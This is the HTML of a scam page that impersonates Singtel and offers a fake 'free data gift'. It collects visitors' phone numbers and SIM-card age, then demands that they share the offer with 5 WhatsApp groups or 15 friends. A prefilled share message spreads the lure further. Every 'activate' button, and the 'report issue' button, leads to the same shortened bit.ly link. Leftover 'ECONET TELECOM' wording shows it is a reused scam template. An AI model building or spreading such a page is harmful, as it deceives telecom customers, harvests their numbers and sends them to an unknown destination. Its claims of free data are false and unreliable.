...
<script>
  ...
  gtag('config', 'UA-180685151-1');
    ...
    <script>
        ...
        <title>SINGTEL TELECOM - FREE DATA GIFT TO ALL CUSTOMERS</title>
        <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
        <meta name="og:title" content="SINGTEL TELECOM - FREE DATA GIFT TO ALL CUSTOMERS" />
        <meta property="og:description" content="SINGTEL TELECOM, is Offering Free Data Gift to all customers" />
        <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHt-6kdbP7ZIDGwlRmcKO4T9HiYx8GPIThbkKfUgKtzPiuh5P7Tg_gcoUFCZxa9nJbHLKdITkagtbaufRzzk8PHyye4Q3qn3ci7WpjJbxmWVgmXOfFQjJwQOQO5JR181thVVPxCxkTmHyMsAyTtMvBac2-dY1upuo-gxfYklkzW1UvZUXc0wqJBseEj0Zs/s320/InShot_20250405_080745989.jpg" />
...
.spin {
    ...
    border: solid 8px rgb(204, 55, 111);
...
.A{
    text-align: center;
    background-color: rgb(204, 55, 111);
}
</style>
  
  
  <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpgTTdBnUbtw44LUK9BP4HnrrLKG961WiREwaWVRbxBdW1LNJZ1bN-luSHPQmhyHq0ItL0ko1RQ4rBRulJHPsO7LpATigs5luG7Zj4aI_iL-hfr5bCyfqtOTUHVwcfoguNdGQWX4Vvk6laJ-27pAISyPIQRMKUAUcczreHP8SYha-L3xj1sZA0xUYXAFQe/s320/images%20-%202025-04-05T114357.276.jpeg" alt="Free-Data" style="width: 100%;">
  ...
  behavior="alternate"
  style="border:solid">
    <marquee behavior="alternate"> <font color="black">SINGTEL TELECOM FREE DATA GIFT TO ALL CUSTOMERS</font></marquee>
</marquee>
...
<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1712111,"","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
</center>
<!-- END: Powered by Supercounters.com -->
                        ...
                        <div class="A">
                        <font color="white">  Dear Customer Kindly Confirm your SINGTEL TELECOM number to activate your free data gift </font><br/> <b><font color="white">DEADLINE:</font></b> <span class="blink"><b><font color="#010101">30th April</font></b> </span><font color="white">Enter your ECONET TELECOM number below and click <b></b>CHECK</b></font>
         </div>
    <div class="post" width="100%">
        ...
        <div id="intro">
            ...
            <p class="welcome">
                ...
                <center><input type="char" placeholder="Enter your SINGTEL TELECOM number" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
        ...
        <div id="info">
           ...
           <center><p class="title"><font color="red">HOW OLD IS YOUR SINGTEL TELECOM SIM CARD</font></p></center>
          <center>
<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
    width: 330px;
    height: 56px;
">
<option value="أختر نوع الشبكة" selected="1">---Select Here---</option>
  <option value="1">6 Month and Above - 5GB  </option>
<option value="2"> 1 Year and Above - 10GB  </option>
<option value="2"> 5 Year and Above - 20GB  </option>
<option value="2"> 10 Year Plus - 30GB  </option>
</select>
</center><br>
          ...
          <button id="confirm">Proceed</button>
            ...
            <p class="error">Sorry, Your Number is Missing <a href="https://offerforall.info/singtel-freedata.com"> <b><font color="#14948F">ADD NUMBER</font></b></a></p>
        </div>
        <div id="checking">
            <p class="title">Activating Data...</p>
            <div class="barr">
                <div class="fill">
                    <div id="fill"></div>
                </div>
        ...
        <div id="share">
            ...
            <p class="tip"> Congratulations, your SINGTEL TELECOM Number <span id="getname"></span>،</p>
            <p class="tip">
                is Eligible to receive Free Data Offer <span class="amount"> Proceed to Activate your Free Data</span><br>
              How to proceed:
            </p><br>
            <p class="tip">1. Share it with 5 groups or 15 friends on WhatsApp (Click on the "SHARE" icon below).</p>
            <p class="tip">2. You will be redirected automatically to our "ACTIVATION" page after the GREEN verification bar is filled.</p>
        ...
        <div id="claim">
            ...
            <p class="title"> Click "ACTIVATE" to activate your Data </p>
           <br/>
          <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE 5GB</font></button>
                    </a><br/>
          
       <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE 10GB</font></button>
                    </a>
             <br/>

            <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE 20GB</font></button>
                    </a>
             <br/>

            <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ACTIVATE UNLIMITED</font></button>
                    </a>
             <br/>
          
          
          <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">REPORT ISSUE</font></button>
                    </a><br/>
        ...
        <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg238hn32Fe-mseh-e6w8tcep8df8ysywaexgpAjMY1p0gdD1x_Mr-1X0BGN2bLehZfrcf1Jz9fIHZJqd5gs-2sW6V1_V6U2I6KdsV1mWTmcGL5LasGl_iqu9QmtYzXtP4NILZTpk1ZTaZqkPU7C63dvD4-2jwje7LeNOEqWTUvhc9wXoCh5CN7I1Wux-LI/s320/images%20-%202025-04-04T214543.115.jpeg" alt="Free-Data" style="width: 100%;">
...
<script>
     ...
     var text1 = "*CONGRATULATIONS TO ALL SINGTEL TELECOM CUSTOMERS*%0A%0ASINGTEL TELECOM is Offering Free Data Gift to all *CUSTOMERS*%0A%0A✅6 Month Old Sim - *5GB*%0A✅1 Year and above - *10GB*%0A✅5 Years and above - *2*%0A✅10 Years plus - *30GB*%0A%0AHurry Now and check if your *SINGTEL SIM CARD* is eligible for this offer%0A%0A_CHECK HERE_👇%0Ahttps://offerforall.info/singtel-freedata.com",
            text2 = " an amount of ",
